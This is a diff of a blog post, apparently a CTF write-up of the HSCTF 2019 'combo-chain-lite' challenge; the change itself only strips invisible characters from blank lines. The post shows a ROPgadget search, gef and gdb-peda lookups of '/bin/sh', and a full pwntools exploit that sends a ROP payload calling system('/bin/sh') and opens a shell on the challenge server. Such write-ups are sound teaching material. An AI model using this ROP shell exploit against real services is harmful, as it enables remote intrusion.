@@ -94,14 +94,14 @@ In ([calling conventions](https://ctf101.org/binary-exploitation/what-are-callin
 ROPgadget \--binary ./combo-chain-lite \| grep "pop rdi"
 
 After having ROP address, we need to find the address of `system` function that imported when executing the program. But here, the program has provided for us.
-​
+
 ![exec-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/exec-combo-chain-lite.PNG)
-​
+
 Next, try to figure out how to put the string "/bin/sh" as `system`'s argument.
 If you look closer, in the program already has that string, we only need to figure out the address of it.
-​
+
 We can use gef or gdb-peda.
-​
+
 -**With gef:**
 {% highlight bash linenos %}
 $ gdb ./combo-chain-lite
@@ -112,7 +112,7 @@ gef➤  grep /bin/sh
 [+] In '/home/node/tmp/combo-chain-lite'(0x402000-0x403000), permission=r--
   0x402051 - 0x402058  →   "/bin/sh"
 {% endhighlight %}
-​
+
 -**With gdb-peda:**
 {% highlight bash linenos %}
 $ gdb ./combo-chain-lite
@@ -128,19 +128,19 @@ combo-chain-lite : 0x403051 --> 0x68732f6e69622f ('/bin/sh')
 {% endhighlight %}
 
 My exploit code:
-​
+
 {% highlight python linenos %}
 #Completed
-​
+
 from pwn import *
-​
+
 rm = remote("pwn.hsctf.com", 3131)
-​
+
 padding = "AAA%AAsAABAA$AAn" #16 ki tu (random pattern)
 rop_addr = p64(0x0000000000401273)
 bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
 sys_addr = p64(int(rm.recv().rsplit(': ')[1], 16)) 
-​
+
 payload = padding + rop_addr  + bin_addr + sys_addr
 print payload
 rm.recv()
@@ -148,8 +148,7 @@ rm.sendline(payload)
 rm.interactive()
 rm.close()
 {% endhighlight %}
-​
+
 ![combo-chain-lite-exploit.png]({{site.baseurl}}/img/ctf/HSCTF/2019/combo-chain-lite-exploit.png)
-​
+
 Done.
-​
